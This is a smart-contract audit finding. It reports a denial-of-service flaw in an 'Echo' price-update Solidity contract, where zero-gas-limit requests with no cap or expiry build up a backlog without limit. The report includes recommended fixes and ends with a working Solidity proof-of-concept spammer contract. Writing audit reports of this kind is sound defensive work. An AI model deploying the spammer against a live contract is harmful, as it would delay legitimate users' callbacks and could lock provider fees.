### Title
Unbounded Request Backlog Enables Provider Keeper DOS via Spam in Echo — (`target_chains/ethereum/contracts/contracts/echo/Echo.sol`)

### Summary

The `Echo` contract's `requestPriceUpdatesWithCallback` function has no minimum `callbackGasLimit` enforcement, no per-user rate limiting, and no request expiry or cancellation mechanism. An unprivileged attacker can spam the contract with zero-gas-limit requests at minimum cost, creating an unbounded backlog of pending requests. The provider's off-chain keeper must process every pending request, and the on-chain `getFirstActiveRequests` view used by the keeper to discover work has O(N) gas cost that grows linearly with the backlog. This delays or blocks legitimate users' price update callbacks.

### Finding Description

`requestPriceUpdatesWithCallback` accepts any `callbackGasLimit` including zero:

```solidity
function requestPriceUpdatesWithCallback(
    address provider,
    uint64 publishTime,
    bytes32[] calldata priceIds,
    uint32 callbackGasLimit          // ← no minimum enforced
) external payable override returns (uint64 requestSequenceNumber) {
    ...
    uint96 requiredFee = getFee(provider, callbackGasLimit, priceIds);
    if (msg.value < requiredFee) revert InsufficientFee();
    ...
}
``` [1](#0-0) 

When `callbackGasLimit = 0`, the fee formula produces the minimum possible fee — only `pythFeeInWei + baseFeeInWei + (priceIds.length * feePerFeedInWei)` — with zero gas compensation:

```solidity
uint256 gasFee = callbackGasLimit * providerFeeInWei;  // = 0 when callbackGasLimit = 0
feeAmount = baseFee + providerBaseFee + providerFeedFee + SafeCast.toUint96(gasFee);
``` [2](#0-1) 

There is no cancellation function, no expiry timestamp, and no per-user request cap. Every request persists in storage until a provider calls `executeCallback`. The keeper discovers pending work via `getFirstActiveRequests`, which performs an unbounded linear scan from `firstUnfulfilledSeq` to `currentSequenceNumber`:

```solidity
while (
    actualCount < count && currentSeq < _state.currentSequenceNumber
) {
    Request memory req = findRequest(currentSeq);
    if (isActive(req)) { ... }
    currentSeq++;
}
``` [3](#0-2) 

The interface documentation explicitly acknowledges this cost scales linearly:

> "Gas Usage: This function's gas cost scales linearly with the number of requests between `firstUnfulfilledSeq` and `currentSequenceNumber`. Each iteration costs approximately 2100 gas for cold storage reads." [4](#0-3) 

Additionally, inside `executeCallback`, a `while` loop advances `firstUnfulfilledSeq` by scanning through all cleared slots. If an attacker creates N requests and the provider fulfills them out of order, the last fulfillment must scan through all N-1 already-cleared slots, consuming unbounded gas:

```solidity
while (
    _state.firstUnfulfilledSeq < _state.currentSequenceNumber &&
    !isActive(findRequest(_state.firstUnfulfilledSeq))
) {
    _state.firstUnfulfilledSeq++;
}
``` [5](#0-4) 

The benchmark test explicitly documents this worst-case:

> "The last fulfillment will be the most expensive since it needs to linearly scan through all the fulfilled requests in storage in order to update `_state.lastUnfulfilledReq`" [6](#0-5) 

### Impact Explanation

**Medium.** An attacker can flood the Echo contract with minimum-fee, zero-gas-limit requests. The provider's off-chain keeper must process every pending request (fetch price data, submit `executeCallback` on-chain). With a large backlog:
1. Legitimate users' callbacks are delayed proportionally to the backlog depth.
2. `getFirstActiveRequests` becomes prohibitively expensive or hits block gas limits, preventing the keeper from discovering pending work.
3. If the keeper processes requests out of order, the `firstUnfulfilledSeq` advancement loop inside `executeCallback` can run out of gas, causing the transaction to revert and locking the provider's accrued fees in the contract (as noted in the inline TODO: "If `executeCallback` can revert, then funds can be permanently locked in the contract"). [7](#0-6) 

### Likelihood Explanation

**High.** The attack requires only a funded EOA and the ability to call `requestPriceUpdatesWithCallback`. No privileged access is needed. The cost per spam request is the minimum protocol fee (e.g., `pythFeeInWei + baseFeeInWei + feePerFeedInWei`), which can be very small. The attack is continuously executable and scales linearly — opening requests for multiple price IDs simultaneously multiplies the keeper burden.

### Recommendation

1. **Enforce a minimum `callbackGasLimit`**: Reject requests where `callbackGasLimit` is below a provider-configured minimum (e.g., `provider.defaultGasLimit`), ensuring the gas fee component always covers the provider's `executeCallback` overhead.
2. **Add request expiry**: Allow requests to expire after a configurable TTL. Expired requests can be cleared without provider action, preventing indefinite backlog accumulation.
3. **Add a cancellation function**: Allow the original requester to cancel a pending request (with a penalty fee to deter abuse).
4. **Cap concurrent requests per user**: Limit the number of simultaneously pending requests per `msg.sender` to bound the attack surface.

### Proof of Concept

```solidity
// Attacker contract
contract EchoSpammer {
    IEcho echo;
    address provider;

    constructor(address _echo, address _provider) {
        echo = IEcho(_echo);
        provider = _provider;
    }

    // Spam N requests with callbackGasLimit = 0 at minimum cost
    function spam(bytes32[] calldata priceIds, uint256 n) external payable {
        bytes32[] memory ids = new bytes32[](1);
        ids[0] = priceIds[0];
        uint96 fee = echo.getFee(provider, 0, ids); // minimum fee, callbackGasLimit=0
        require(msg.value >= fee * n, "insufficient ETH");
        for (uint i = 0; i < n; i++) {
            echo.requestPriceUpdatesWithCallback{value: fee}(
                provider,
                uint64(block.timestamp),
                ids,
                0  // callbackGasLimit = 0, callback will always fail
            );
        }
    }
}
```

After `spam()` creates N requests:
- `getFirstActiveRequests(10)` must scan up to N slots, costing `~2100 * N` gas.
- The provider's keeper is forced to submit N `executeCallback` transactions, each paying for Pyth price parsing overhead, delaying all legitimate pending requests.
- If the keeper fulfills requests out of order, the `firstUnfulfilledSeq` advancement loop inside `executeCallback` scans O(N) cleared slots, potentially reverting due to out-of-gas and permanently locking the provider's accrued fees. [8](#0-7) [9](#0-8)
